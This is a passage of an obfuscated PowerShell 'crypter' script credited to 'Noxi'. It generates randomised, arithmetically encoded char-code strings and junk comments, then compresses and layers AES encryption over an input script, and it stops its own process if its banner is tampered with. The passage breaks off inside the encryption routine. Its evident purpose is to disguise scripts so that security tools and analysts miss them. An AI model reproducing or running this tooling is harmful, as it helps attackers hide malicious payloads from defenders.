        '([char](((-9825 -Band 4764) + (-9825 -Bor 4764) + 2040 + 3133))+[char](((-20315 -Band 2209) + (-20315 -Bor 2209) + 8303 + 9868))+[char](((-2529 -Band 7648) + (-2529 -Bor 7648) - 5859 + 808))+[char](((7252 -Band 2277) + (7252 -Bor 2277) - 302 - 9159))+[char]((5622 - 3394 - 9133 + 6978))+[char](((-87 -Band 1029) + (-87 -Bor 1029) + 3425 - 4289))+[char]((-9469 - 4396 + 8378 + 5558)))',
        '([char](((-19670 -Band 8412) + (-19670 -Bor 8412) + 2150 + 9188))+[char](((-5037 -Band 5259) + (-5037 -Bor 5259) - 5734 + 5609))+[char](((-4747 -Band 9561) + (-4747 -Bor 9561) - 1159 - 3587))+[char](((-4243 -Band 4821) + (-4243 -Bor 4821) + 4646 - 5124))+[char]((-1255 - 1555 - 4824 + 7707))+[char]((8700 - 2599 - 6212 + 221))+[char](((-1182 -Band 261) + (-1182 -Bor 261) + 6739 - 5747)))',
        '([char](((-4628 -Band 6919) + (-4628 -Bor 6919) + 3573 - 5752))+[char]((-5570 - 886 + 2766 + 3755))+[char](((-11413 -Band 6038) + (-11413 -Bor 6038) + 2010 + 3465))+[char](((-15039 -Band 7467) + (-15039 -Bor 7467) + 8135 - 495))+[char]((15633 - 5725 - 2242 - 7561))+[char]((-8113 - 4388 + 3708 + 8871))+[char]((9921 - 1262 - 4068 - 4488)))',
        '([char]((-3695 - 3986 + 8223 - 430))+[char]((-9367 - 1393 + 1524 + 9333))+[char]((-7347 - 1018 + 7106 + 1359))+[char](((7447 -Band 1929) + (7447 -Bor 1929) - 6163 - 3145))+[char](((1377 -Band 6096) + (1377 -Bor 6096) - 4542 - 2858))+[char]((7055 - 7542 + 9450 - 8885))+[char](((-3714 -Band 3962) + (-3714 -Bor 3962) - 2462 + 2285)))',
        '([char]((13555 - 775 - 7047 - 5621))+[char]((3304 - 3138 - 5881 + 5812))+[char]((16652 - 6556 - 6797 - 3199))+[char](((-5842 -Band 4335) + (-5842 -Bor 4335) + 2875 - 1268))+[char]((9982 - 5847 + 530 - 4592))+[char](((-7438 -Band 989) + (-7438 -Bor 989) + 3084 + 3475))+[char]((11961 - 7898 + 3791 - 7751)))',
        '([char]((14798 - 580 - 7950 - 6156))+[char]((9472 - 4567 - 5499 + 691))+[char]((-7833 - 2824 + 7724 + 3033))+[char]((14028 - 7492 - 5223 - 1213))+[char](((-11805 -Band 5463) + (-11805 -Bor 5463) + 789 + 5658))+[char](((3858 -Band 941) + (3858 -Bor 941) - 682 - 4007))+[char]((16827 - 9025 + 1120 - 8819)))')
    $paddingobf = $nvpadding | Get-Random
    return $paddingobf
}

function blocksizeobf {
    $nvblocksize = @(
        '([char](((-4932 -Band 4336) + (-4932 -Bor 4336) - 3359 + 4021))+[char](((-14566 -Band 8460) + (-14566 -Bor 8460) + 7805 - 1623))+[char]((16097 - 8288 - 9205 + 1475))+[char]((13939 - 9723 - 19 - 4130))+[char]((12172 - 7846 + 3245 - 7496))+[char]((-7944 - 5325 + 9881 + 3471))+[char]((-1805 - 7674 + 7836 + 1716))+[char](((-12290 -Band 7035) + (-12290 -Bor 7035) - 4274 + 9619))+[char]((12337 - 8335 - 9195 + 5262)))',
        '([char](((-3307 -Band 9848) + (-3307 -Bor 9848) - 4866 - 1609))+[char]((6934 - 4257 + 3281 - 5850))+[char](((4488 -Band 1794) + (4488 -Bor 1794) - 6845 + 674))+[char](((-6981 -Band 9732) + (-6981 -Bor 9732) + 2929 - 5581))+[char](((-26393 -Band 8431) + (-26393 -Bor 8431) + 9131 + 8938))+[char]((6524 - 4740 - 3646 + 1945))+[char]((-15933 - 375 + 8415 + 7998))+[char](((-10613 -Band 711) + (-10613 -Bor 711) + 5949 + 4075))+[char]((15092 - 7180 - 9053 + 1242)))',
        '([char]((-4345 - 2489 - 1930 + 8862))+[char]((6404 - 7953 + 8833 - 7208))+[char](((-2628 -Band 4905) + (-2628 -Bor 4905) - 8859 + 6661))+[char](((4808 -Band 2663) + (4808 -Bor 2663) - 4868 - 2536))+[char](((-9333 -Band 4319) + (-9333 -Bor 4319) + 1282 + 3807))+[char]((-2175 - 7465 + 4355 + 5368))+[char](((-7924 -Band 9290) + (-7924 -Bor 9290) - 8590 + 7297))+[char]((10237 - 8004 - 9268 + 7125))+[char](((-10061 -Band 7995) + (-10061 -Bor 7995) + 830 + 1305)))',
        '([char](((-8654 -Band 1874) + (-8654 -Bor 1874) + 4498 + 2348))+[char]((5971 - 4324 - 8000 + 6461))+[char]((10059 - 2021 - 4936 - 3023))+[char](((-609 -Band 5636) + (-609 -Bor 5636) - 6024 + 1096))+[char](((-6366 -Band 4125) + (-6366 -Bor 4125) - 7401 + 9717))+[char](((3936 -Band 7446) + (3936 -Bor 7446) - 2522 - 8745))+[char](((-9465 -Band 402) + (-9465 -Bor 402) + 8375 + 761))+[char]((9009 - 3507 - 9403 + 4023))+[char]((826 - 2422 + 5684 - 4019)))',
        '([char](((1518 -Band 1069) + (1518 -Bor 1069) + 824 - 3313))+[char](((-1513 -Band 5283) + (-1513 -Bor 5283) - 6690 + 2996))+[char]((-4196 - 1791 + 307 + 5791))+[char](((-15692 -Band 4842) + (-15692 -Bor 4842) + 7665 + 3252))+[char](((16394 -Band 634) + (16394 -Bor 634) - 9960 - 6961))+[char]((-1471 - 2644 + 9096 - 4898))+[char](((-12721 -Band 2768) + (-12721 -Bor 2768) + 8819 + 1239))+[char]((20257 - 5443 - 9760 - 4964))+[char](((-11090 -Band 9445) + (-11090 -Bor 9445) - 2527 + 4273)))',
        '([char](((-6715 -Band 4376) + (-6715 -Bor 4376) + 7410 - 4973))+[char](((-11760 -Band 458) + (-11760 -Bor 458) + 4135 + 7275))+[char](((4318 -Band 781) + (4318 -Bor 781) + 4315 - 9303))+[char](((-2103 -Band 9648) + (-2103 -Bor 9648) - 1897 - 5581))+[char](((-17689 -Band 8206) + (-17689 -Bor 8206) + 3858 + 5700))+[char]((-8953 - 8038 + 8137 + 8937))+[char](((-5958 -Band 3087) + (-5958 -Bor 3087) + 4953 - 2009))+[char](((-12839 -Band 5199) + (-12839 -Bor 5199) + 1707 + 6055))+[char]((3229 - 1890 + 4055 - 5293)))',
        '([char](((-12937 -Band 2370) + (-12937 -Bor 2370) + 4914 + 5751))+[char](((1654 -Band 9502) + (1654 -Bor 9502) - 2504 - 8544))+[char](((-15212 -Band 5765) + (-15212 -Bor 5765) + 861 + 8697))+[char]((13373 - 7393 - 3209 - 2672))+[char](((11996 -Band 175) + (11996 -Bor 175) - 5722 - 6342))+[char]((4363 - 895 - 3747 + 394))+[char]((13382 - 1420 - 5718 - 6139))+[char](((-7098 -Band 4223) + (-7098 -Bor 4223) + 8385 - 5388))+[char]((9446 - 3570 + 2448 - 8223)))',
        '([char]((10534 - 2816 - 4256 - 3396))+[char]((-8798 - 4791 + 8606 + 5059))+[char]((-5725 - 3417 - 583 + 9804))+[char](((6620 -Band 5040) + (6620 -Bor 5040) - 8780 - 2813))+[char](((-8270 -Band 5338) + (-8270 -Bor 5338) - 4757 + 7764))+[char](((8328 -Band 131) + (8328 -Bor 131) - 6200 - 2176))+[char](((6468 -Band 2213) + (6468 -Bor 2213) - 2879 - 5697))+[char](((624 -Band 2761) + (624 -Bor 2761) + 6042 - 9305))+[char]((17674 - 8570 - 1532 - 7471)))')
    $blocksizeobf = $nvblocksize | Get-Random
    return $blocksizeobf
}

function transformobf {
    $nvtransform = @(
        '([char]((14928 - 2050 - 4377 - 8417))+[char](((8306 -Band 4120) + (8306 -Bor 4120) - 5952 - 6392))+[char](((-17078 -Band 8039) + (-17078 -Bor 8039) + 4854 + 4250))+[char](((3820 -Band 1161) + (3820 -Bor 1161) + 4664 - 9567))+[char]((17983 - 7850 - 3024 - 7026))+[char](((-95 -Band 1792) + (-95 -Bor 1792) + 560 - 2187))+[char](((-17390 -Band 7003) + (-17390 -Bor 7003) + 7945 + 2521))+[char](((-10780 -Band 6220) + (-10780 -Bor 6220) + 2295 + 2347))+[char](((-17484 -Band 3660) + (-17484 -Bor 3660) + 7163 + 6738))+[char](((-5587 -Band 8940) + (-5587 -Bor 8940) - 5603 + 2320))+[char](((-5644 -Band 2381) + (-5644 -Bor 2381) - 762 + 4098))+[char](((-5682 -Band 9155) + (-5682 -Bor 9155) + 4230 - 7625))+[char]((5357 - 841 - 5135 + 684))+[char](((11428 -Band 41) + (11428 -Bor 41) - 2010 - 9383))+[char](((-2232 -Band 1877) + (-2232 -Bor 1877) - 6287 + 6708))+[char]((-3350 - 8599 + 7151 + 4874))+[char]((-9673 - 6406 + 6704 + 9454))+[char]((-11740 - 2703 + 7536 + 6974))+[char](((-1859 -Band 3813) + (-1859 -Bor 3813) - 1014 - 865)))',
        '([char](((-13171 -Band 9565) + (-13171 -Bor 9565) - 2819 + 6509))+[char]((16943 - 7660 - 1671 - 7498))+[char](((856 -Band 8842) + (856 -Bor 8842) - 4296 - 5305))+[char]((3712 - 6011 + 2592 - 183))+[char]((6040 - 6586 + 5361 - 4700))+[char]((6933 - 8369 - 4994 + 6532))+[char]((2837 - 4806 + 9311 - 7231))+[char](((-6794 -Band 503) + (-6794 -Bor 503) - 2665 + 9070))+[char]((-2493 - 5276 + 3398 + 4480))+[char](((686 -Band 1235) + (686 -Bor 1235) - 3435 + 1584))+[char]((-278 - 2213 + 2824 - 228))+[char]((-1770 - 3257 - 147 + 5284))+[char](((940 -Band 14) + (940 -Bor 14) - 2340 + 1483))+[char](((4634 -Band 5044) + (4634 -Bor 5044) - 4178 - 5392))+[char](((455 -Band 560) + (455 -Bor 560) - 1393 + 444))+[char](((-2973 -Band 1693) + (-2973 -Bor 1693) - 2156 + 3544))+[char]((4934 - 4670 - 763 + 610))+[char]((-6439 - 1984 + 5945 + 2577))+[char]((-2702 - 7256 + 538 + 9527)))',
        '([char](((-1376 -Band 1756) + (-1376 -Bor 1756) + 445 - 709))+[char](((3439 -Band 5883) + (3439 -Bor 5883) - 8519 - 721))+[char](((-13080 -Band 5167) + (-13080 -Bor 5167) + 5629 + 2349))+[char](((-2289 -Band 706) + (-2289 -Bor 706) - 6004 + 7665))+[char]((13594 - 7913 - 1708 - 3890))+[char](((222 -Band 7586) + (222 -Bor 7586) - 3527 - 4211))+[char](((-5534 -Band 5294) + (-5534 -Bor 5294) + 3900 - 3581))+[char](((-5214 -Band 3127) + (-5214 -Bor 3127) + 5870 - 3701))+[char]((4913 - 9851 - 2753 + 7768))+[char]((12241 - 9806 - 3017 + 652))+[char]((-11948 - 3033 + 7206 + 7848))+[char](((-10797 -Band 7968) + (-10797 -Bor 7968) + 6871 - 3964))+[char](((-10932 -Band 2822) + (-10932 -Bor 2822) + 4015 + 4160))+[char]((13293 - 506 - 9255 - 3456))+[char](((6603 -Band 5704) + (6603 -Bor 5704) - 3871 - 8370))+[char]((-3522 - 1254 + 5572 - 720))+[char](((-5399 -Band 6600) + (-5399 -Bor 6600) + 782 - 1904))+[char]((5822 - 9658 + 5092 - 1189))+[char](((11257 -Band 143) + (11257 -Bor 143) - 1901 - 9424)))',
        '([char]((9236 - 9771 + 2706 - 2087))+[char](((957 -Band 3372) + (957 -Bor 3372) - 1264 - 2951))+[char]((383 - 4551 + 7482 - 3249))+[char](((6463 -Band 5881) + (6463 -Bor 5881) - 3440 - 8794))+[char]((768 - 133 + 6236 - 6788))+[char](((8297 -Band 6212) + (8297 -Bor 6212) - 5593 - 8814))+[char](((-2329 -Band 1646) + (-2329 -Bor 1646) - 2081 + 2843))+[char]((10971 - 1615 - 6356 - 2886))+[char](((-6815 -Band 8709) + (-6815 -Bor 8709) - 7051 + 5234))+[char]((382 - 5182 + 693 + 4209))+[char]((-1983 - 2595 + 4404 + 247))+[char](((-12718 -Band 8710) + (-12718 -Bor 8710) + 301 + 3817))+[char](((-4017 -Band 2488) + (-4017 -Bor 2488) - 5595 + 7189))+[char](((788 -Band 4418) + (788 -Bor 4418) + 1044 - 6142))+[char]((8201 - 6149 + 4706 - 6692))+[char](((888 -Band 6036) + (888 -Bor 6036) + 1306 - 8122))+[char](((-17142 -Band 2490) + (-17142 -Bor 2490) + 8163 + 6568))+[char]((3175 - 3084 + 6368 - 6360))+[char](((-22417 -Band 8756) + (-22417 -Bor 8756) + 4327 + 9409)))',
        '([char]((7051 - 7621 + 5857 - 5171))+[char](((5187 -Band 4007) + (5187 -Bor 4007) - 1518 - 7594))+[char]((-3076 - 3026 + 2587 + 3612))+[char](((14928 -Band 3171) + (14928 -Bor 3171) - 9700 - 8321))+[char](((-10352 -Band 8563) + (-10352 -Bor 8563) - 2499 + 4403))+[char](((-2885 -Band 3592) + (-2885 -Bor 3592) - 6804 + 6167))+[char]((10640 - 1629 - 1115 - 7785))+[char](((-1019 -Band 9722) + (-1019 -Bor 9722) - 4384 - 4237))+[char]((15 - 690 + 4207 - 3423))+[char]((12361 - 4762 - 7448 - 81))+[char]((7201 - 8237 - 935 + 2076))+[char](((-486 -Band 4499) + (-486 -Bor 4499) + 4887 - 8822))+[char]((-1370 - 4635 + 284 + 5818))+[char](((-21161 -Band 3071) + (-21161 -Bor 3071) + 9927 + 8239))+[char](((-19928 -Band 7317) + (-19928 -Bor 7317) + 4147 + 8562))+[char]((13465 - 7724 - 9656 + 3991))+[char]((19894 - 6847 - 8428 - 4508))+[char](((-13680 -Band 9412) + (-13680 -Bor 9412) + 3789 + 546))+[char]((-2677 - 4595 + 9831 - 2452)))',
        '([char](((-2662 -Band 8816) + (-2662 -Bor 8816) - 1402 - 4636))+[char](((-21374 -Band 7520) + (-21374 -Bor 7520) + 7461 + 6507))+[char](((-8249 -Band 6205) + (-8249 -Bor 6205) + 1054 + 1087))+[char]((4674 - 8136 + 6803 - 3263))+[char]((11771 - 4373 - 8138 + 823))+[char](((-5057 -Band 6522) + (-5057 -Bor 6522) + 6193 - 7588))+[char]((-111 - 1705 + 185 + 1710))+[char](((-2989 -Band 3944) + (-2989 -Bor 3944) + 9108 - 9981))+[char](((-18773 -Band 7961) + (-18773 -Bor 7961) + 4435 + 6454))+[char]((18885 - 9345 - 5778 - 3692))+[char]((-7997 - 1703 + 9145 + 628))+[char]((12349 - 1812 - 5412 - 5047))+[char](((-12456 -Band 3931) + (-12456 -Bor 3931) + 341 + 8249))+[char]((8808 - 9990 + 3832 - 2574))+[char]((15108 - 6299 - 5249 - 3494))+[char](((-13524 -Band 2887) + (-13524 -Bor 2887) + 4570 + 6143))+[char]((-3500 - 7209 + 8000 + 2788))+[char](((-21375 -Band 9043) + (-21375 -Bor 9043) + 6631 + 5768))+[char](((10479 -Band 7378) + (10479 -Bor 7378) - 9833 - 7949)))',
        '([char](((-10103 -Band 4576) + (-10103 -Bor 4576) + 3597 + 2046))+[char]((15806 - 9333 - 3970 - 2389))+[char](((-20515 -Band 9740) + (-20515 -Bor 9740) + 6114 + 4758))+[char](((-706 -Band 5498) + (-706 -Bor 5498) - 4325 - 357))+[char]((7857 - 787 + 645 - 7600))+[char](((-14837 -Band 9491) + (-14837 -Bor 9491) + 7331 - 1883))+[char](((-9867 -Band 3205) + (-9867 -Bor 3205) + 7165 - 392))+[char]((-465 - 9283 + 1092 + 8770))+[char]((-9781 - 627 + 5364 + 5153))+[char](((-13511 -Band 8221) + (-13511 -Bor 8221) + 6276 - 916))+[char]((-163 - 1838 + 566 + 1540))+[char]((14593 - 2894 - 2553 - 9036))+[char](((8976 -Band 3491) + (8976 -Bor 3491) - 3153 - 9217))+[char]((16836 - 9498 - 1933 - 5297))+[char]((-7122 - 1502 + 9590 - 900))+[char]((17212 - 4603 - 5344 - 7157))+[char]((19613 - 6952 - 8758 - 3792))+[char]((-10151 - 1237 + 3491 + 7996))+[char](((7798 -Band 4323) + (7798 -Bor 4323) - 3536 - 8478)))',
        '([char]((5724 - 358 - 1925 - 3357))+[char]((11932 - 9561 - 9010 + 6721))+[char](((-5931 -Band 6511) + (-5931 -Bor 6511) - 8677 + 8162))+[char]((-6238 - 3916 + 5678 + 4554))+[char](((-22836 -Band 9023) + (-22836 -Bor 9023) + 7124 + 6772))+[char]((9990 - 4385 + 36 - 5571))+[char](((-12126 -Band 2008) + (-12126 -Bor 2008) + 4838 + 5391))+[char](((-1353 -Band 2713) + (-1353 -Bor 2713) - 4694 + 3416))+[char]((4653 - 237 + 174 - 4513))+[char]((99 - 109 - 8565 + 8645))+[char](((-1558 -Band 3393) + (-1558 -Bor 3393) + 8180 - 9910))+[char]((7221 - 3436 - 2044 - 1631))+[char](((-7113 -Band 221) + (-7113 -Bor 221) + 9285 - 2296))+[char](((-4354 -Band 6995) + (-4354 -Bor 6995) - 373 - 2160))+[char]((-497 - 2861 + 8901 - 5477))+[char](((-8260 -Band 7057) + (-8260 -Bor 7057) + 2693 - 1382))+[char]((5854 - 7706 - 813 + 2776))+[char](((8326 -Band 1555) + (8326 -Bor 1555) - 783 - 8999))+[char]((19684 - 2398 - 7758 - 9421)))')
    $transformobf = $nvtransform | Get-Random
    return $transformobf
}

function modeobf {
    $nvmode = @(
        '([char](((248 -Band 9059) + (248 -Bor 9059) - 3357 - 5841))+[char]((11344 - 4085 - 2711 - 4469))+[char](((-4790 -Band 3376) + (-4790 -Bor 3376) + 3096 - 1582))+[char](((3424 -Band 2708) + (3424 -Bor 2708) + 3386 - 9449)))',
        '([char]((-8464 - 190 + 8751 + 12))+[char]((2979 - 17 + 3577 - 6460))+[char]((11369 - 8221 - 4816 + 1736))+[char]((747 - 829 - 1136 + 1319)))',
        '([char](((1149 -Band 5333) + (1149 -Bor 5333) - 302 - 6071))+[char](((-13464 -Band 9244) + (-13464 -Bor 9244) + 434 + 3897))+[char]((20863 - 9699 - 3986 - 7110))+[char]((-9029 - 1236 + 8440 + 1894)))',
        '([char](((15268 -Band 1496) + (15268 -Bor 1496) - 9928 - 6727))+[char]((-1940 - 2329 + 4935 - 587))+[char]((-7074 - 1813 + 6888 + 2067))+[char]((10971 - 171 - 5135 - 5596)))',
        '([char]((1755 - 9085 + 956 + 6451))+[char]((14553 - 2921 - 7550 - 3971))+[char]((-808 - 5200 + 8747 - 2639))+[char](((1531 -Band 4503) + (1531 -Bor 4503) + 3717 - 9650)))',
        '([char]((9193 - 7947 + 5568 - 6737))+[char](((-5081 -Band 1258) + (-5081 -Bor 1258) + 617 + 3285))+[char]((2958 - 3917 - 5236 + 6295))+[char](((2663 -Band 1677) + (2663 -Bor 1677) + 815 - 5054)))',
        '([char]((14675 - 8521 + 2903 - 8980))+[char]((9156 - 9740 - 933 + 1628))+[char](((12950 -Band 186) + (12950 -Bor 186) - 7671 - 5397))+[char]((-1318 - 4678 + 3132 + 2933)))',
        '([char](((-20218 -Band 1983) + (-20218 -Bor 1983) + 9510 + 8802))+[char](((-18939 -Band 7924) + (-18939 -Bor 7924) + 7945 + 3149))+[char]((7929 - 2280 - 3509 - 2072))+[char]((14538 - 1279 - 9097 - 4093)))')
    $modeobf = $nvmode | Get-Random
    return $modeobf
}

function noobf {
    $nvob = @(
        '& ([char]((-10891 - 24 + 3236 + 7757))+[char]((12098 - 7077 - 5680 + 728))+[char]((12469 - 8189 + 3782 - 7975))+[char](((-5297 -Band 5490) + (-5297 -Bor 5490) + 1793 - 1941))+[char]((-9710 - 1486 + 1833 + 9442))+[char](((-270 -Band 8316) + (-270 -Bor 8316) - 8888 + 908))+[char](((2326 -Band 2963) + (2326 -Bor 2963) + 2111 - 7326))+[char](((24 -Band 7517) + (24 -Bor 7517) - 5780 - 1692))+[char]((1597 - 7617 + 4497 + 1590))+[char]((18134 - 6430 - 6701 - 4919)))',
        '& ([char]((7751 - 4033 + 3198 - 6806))+[char]((-6095 - 61 - 1171 + 7428))+[char](((-18933 -Band 7791) + (-18933 -Bor 7791) + 5970 + 5291))+[char](((591 -Band 1059) + (591 -Bor 1059) + 7795 - 9400))+[char](((-7663 -Band 6036) + (-7663 -Bor 6036) - 1528 + 3266))+[char](((-17694 -Band 2597) + (-17694 -Bor 2597) + 8347 + 6848))+[char](((11313 -Band 4935) + (11313 -Bor 4935) - 9829 - 6313))+[char]((9723 - 8081 + 16 - 1557))+[char]((8797 - 6108 - 3763 + 1173))+[char](((-585 -Band 7203) + (-585 -Bor 7203) - 7690 + 1188)))',
        '& ([char](((5625 -Band 4524) + (5625 -Bor 4524) - 941 - 9130))+[char](((12451 -Band 4095) + (12451 -Bor 4095) - 7389 - 9056))+[char](((-8825 -Band 93) + (-8825 -Bor 93) + 9121 - 302))+[char](((-13482 -Band 9998) + (-13482 -Bor 9998) - 2895 + 6424))+[char](((-10270 -Band 6301) + (-10270 -Bor 6301) + 54 + 3994))+[char](((-12772 -Band 8829) + (-12772 -Bor 8829) + 8800 - 4759))+[char]((5132 - 6631 - 3401 + 4974))+[char](((-6266 -Band 7724) + (-6266 -Bor 7724) - 1928 + 571))+[char]((-14184 - 2806 + 9560 + 7497))+[char](((14865 -Band 2590) + (14865 -Bor 2590) - 9817 - 7522)))',
        '& ([char](((2371 -Band 7825) + (2371 -Bor 7825) - 2561 - 7557))+[char]((912 - 2149 - 6067 + 7373))+[char]((-4928 - 54 + 3918 + 1151))+[char](((-9335 -Band 8691) + (-9335 -Bor 8691) + 8348 - 7659))+[char](((-13828 -Band 9936) + (-13828 -Bor 9936) + 1901 + 2102))+[char](((-11118 -Band 6866) + (-11118 -Bor 6866) + 9600 - 5250))+[char](((6125 -Band 3787) + (6125 -Bor 3787) - 9993 + 187))+[char]((21505 - 5580 - 9370 - 6454))+[char]((-1743 - 4771 + 6678 - 65))+[char](((9377 -Band 1611) + (9377 -Bor 1611) - 6174 - 4698)))',
        '& ([char]((4061 - 3397 + 7445 - 7999))+[char]((-6365 - 3665 + 3406 + 6725))+[char](((-3889 -Band 602) + (-3889 -Bor 602) - 4734 + 8140))+[char](((1353 -Band 7521) + (1353 -Bor 7521) - 8763 - 66))+[char](((-14627 -Band 6473) + (-14627 -Bor 6473) + 501 + 7732))+[char](((-4638 -Band 6487) + (-4638 -Bor 6487) + 1280 - 3063))+[char]((3751 - 3860 - 3265 + 3448))+[char]((-3990 - 4904 + 2580 + 6383))+[char]((14068 - 8198 + 1461 - 7264))+[char]((8139 - 6365 + 1913 - 3603)))',
        '& ([char](((-3670 -Band 3885) + (-3670 -Bor 3885) - 4766 + 4661))+[char]((-3207 - 9005 + 5745 + 6536))+[char]((-8482 - 421 + 5181 + 3841))+[char](((-11056 -Band 5543) + (-11056 -Bor 5543) - 2962 + 8520))+[char](((1306 -Band 4017) + (1306 -Bor 4017) + 2712 - 7924))+[char]((3389 - 6018 + 8096 - 5401))+[char]((-8213 - 9333 + 8219 + 9433))+[char](((5812 -Band 2033) + (5812 -Bor 2033) - 4886 - 2890))+[char](((3849 -Band 1292) + (3849 -Bor 1292) - 6398 + 1356))+[char]((-5593 - 5447 + 3811 + 7313)))',
        '& ([char](((1228 -Band 4038) + (1228 -Bor 4038) - 5048 - 108))+[char]((6674 - 2800 + 3778 - 7583))+[char](((12639 -Band 1539) + (12639 -Bor 1539) - 4594 - 9497))+[char](((-3414 -Band 5768) + (-3414 -Bor 5768) - 2850 + 541))+[char]((515 - 5399 + 8119 - 3156))+[char]((-1548 - 570 + 277 + 1939))+[char]((16477 - 5233 - 5317 - 5821))+[char](((-3517 -Band 8866) + (-3517 -Bor 8866) - 6849 + 1601))+[char]((223 - 184 - 500 + 560))+[char](((4747 -Band 5927) + (4747 -Bor 5927) - 622 - 9968)))',
        '& ([char]((7206 - 2037 - 8603 + 3512))+[char]((8403 - 8409 - 4297 + 4372))+[char]((14809 - 5237 - 2821 - 6664))+[char]((16984 - 5733 - 8454 - 2752))+[char](((-7747 -Band 3460) + (-7747 -Bor 3460) + 3507 + 859))+[char](((-7968 -Band 2736) + (-7968 -Bor 2736) + 8102 - 2804))+[char](((6526 -Band 3259) + (6526 -Bor 3259) - 942 - 8769))+[char]((6206 - 3315 - 7498 + 4708))+[char](((4546 -Band 5614) + (4546 -Bor 5614) - 868 - 9193))+[char](((-10104 -Band 5529) + (-10104 -Bor 5529) + 2049 + 2642)))')
    $obobf = $nvob | Get-Random
    return $obobf
}

function confusekey {
    param ([int]$keycount = 5,[int]$minkeylength = 70,[int]$maxkeylength = 80)
    $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=|~?!`*§%&()[]{}-+:;\"<>$^'
    $alphabetarray = $alphabet.ToCharArray()
    $alphabetsize = $alphabetarray.Length
    $nvrandomkeys = @()
    for ($i = 0; $i -lt $keycount; $i++) {
        $keylength = Get-random -Minimum $minkeylength -Maximum ($maxkeylength + 1)
        $key = -join (1..$keylength | ForEach-Object { $alphabetarray[(Get-random -Minimum 0 -Maximum $alphabetsize)] })
        $nvrandomkeys += "#$key/no$key.xi$key[nove$key/rse"
    }
    return ($nvrandomkeys -join "`n")
}

function linefuse {
    param ([int]$keycount = 4,[int]$minkeylength = 75,[int]$maxkeylength = 100)
    $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    $alphabetarray = $alphabet.ToCharArray()
    $alphabetsize = $alphabetarray.Length
    $nvrandomkeys = @()
    for ($i = 0; $i -lt $keycount; $i++) {
        $keylength = Get-random -Minimum $minkeylength -Maximum ($maxkeylength + 1)
        $key = -join (1..$keylength | ForEach-Object { $alphabetarray[(Get-random -Minimum 0 -Maximum $alphabetsize)] })
        $nvrandomkeys += "#$key/nOXi$key.Nox1$key[NoV3rSe$key/n0vERsE"
    }return ($nvrandomkeys -join "`n")
}

function number {param ([int]$min = 10,[int]$max = 999999);return Get-random -Minimum $min -Maximum $max}

function nvcrypter {
    [CmdletBinding()]Param ([Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)][string] $nvi = $(log "[-]" "Nvi not set"),[Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)][string] $nvo = $(log "[-]" "Nvo not set"),
    [Parameter(Mandatory=$false,ValueFromPipeline,ValueFromPipelineByPropertyName)][string] $iterations = 2)
    process {
        bannercyan
        .([char](((576 -Band 2648) + (576 -Bor 2648) + 5694 - 8810))+[char]((3166 - 8203 + 3786 + 1362))+[char](((-3686 -Band 4682) + (-3686 -Bor 4682) - 7474 + 6581))) ([SYSTEM.text.ENcOdInG]::Utf8.GEtString((91, 33, 93))) ([SySTeM.text.ENCODing]::UTf8.GEtStrING((0x4d, 0x61, 0x64, 0x65, 0x20, 0x62, 0x79, 0x20, 0x4e, 0x6f, 0x78, 0x69, 0x20, 0x2d))) ([sYSTEM.text.EnCodInG]::UtF8.geTStRing((104, 116, 0x74, 0x70, 115, 58, 0x2f, 47, 100, 105, 115, 99, 111, 114, 0x64, 0x2e, 103, 0x67, 0x2f, 69, 50)) + [SYstem.TEXT.EnCODInG]::uTF8.getsTRinG((121, 98, 71, 52, 106, 57, 106, 85))) -HighlightColor DarkRed -SequenceColor Blue;if("$nv"-notlike ([SyStEm.tEXT.enCoDING]::UTf8.GEtStRIng((42, 78)) + [sYsTeM.tExt.EncoDIng]::uTF8.getStRINg((0x6f, 0x78)) + [SYSTeM.text.ENCoDiNG]::UTF8.gEtsTRInG([systEm.cOnverT]::froMBaSe64String('aSo=')))){.([char](((-12285 -Band 1493) + (-12285 -Bor 1493) + 5155 + 5752))+[char](((-2805 -Band 8237) + (-2805 -Bor 8237) + 3146 - 8466))+[char]((580 - 335 + 5552 - 5685))+[char](((-14392 -Band 3990) + (-14392 -Bor 3990) + 1552 + 8965))) -Id $pId}; sleep 1
        log "[/]" "Reading content from $nvi" -HighlightColor Yellow
        $nvcodeb = [System.IO.File]::ReadAllBytes($nvi)
        $usedkeys = @()
        log "[~]" "Applying $iterations layers" -HighlightColor Gray
        for ($i = 1; $i -le $iterations; $i++) {
            $paddingmodes = 'PKCS7','ISO10126','ANSIX923','Zeros'
            $paddingmode = $paddingmodes | Get-random
            #$ciphermode = 'cbc'
            #$keysize = 256
            $compressiontypes = 'Gzip','Deflate'
            $compressiontype = $compressiontypes | Get-random

            [System.IO.MemoryStream] $output = &(GCM *w-o*t) System.IO.MemoryStream
            if ($compressiontype -eq "Gzip") {$compressionStream = &(GCM *w-o*t) System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
            } elseif ( $compressiontype -eq "Deflate") {$compressionStream = &(GCM *w-o*t) System.IO.Compression.DeflateStream $output, ([IO.Compression.CompressionMode]::Compress)}
      	    $compressionStream.Write( $nvcodeb, 0, $nvcodeb.Length )
            $compressionStream.Close()
            $output.Close()
            $compressedbytes = $output.ToArray()

			$nvaesm = &(GCM *w-o*t) "System.Security.Cryptography.AesManaged"
            if ($paddingmode -eq 'PKCS7') {$nvaesm.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            } elseif ($paddingmode -eq 'ISO10126') {$nvaesm.Padding = [System.Security.Cryptography.PaddingMode]::ISO10126
            } elseif ($paddingmode -eq 'ANSIX923') {$nvaesm.Padding = [System.Security.Cryptography.PaddingMode]::ANSIX923
            } elseif ($paddingmode -eq 'Zeros') {$nvaesm.Padding = [System.Security.Cryptography.PaddingMode]::Zeros}

			$nvaesm.blocksize = 128
            $nvaesm.keysize = 256
            $nvaesm.GenerateKey()
            $b64key = [System.Convert]::ToBase64String($nvaesm.Key)
            $usedkeys += $b64key
            log "[~]" "Used $paddingmode" -HighlightColor Gray;sleep -Milliseconds 100
            log "[~]" "Used $compressiontype" -HighlightColor Gray;sleep -Milliseconds 100
            log "[*]" "Used $b64key" -HighlightColor blue;sleep -Milliseconds 100

            $encryptor = $nvaesm.CreateEncryptor()
            $encryptedat = $encryptor.TransformFinalBlock($compressedbytes, 0, $compressedbytes.Length);
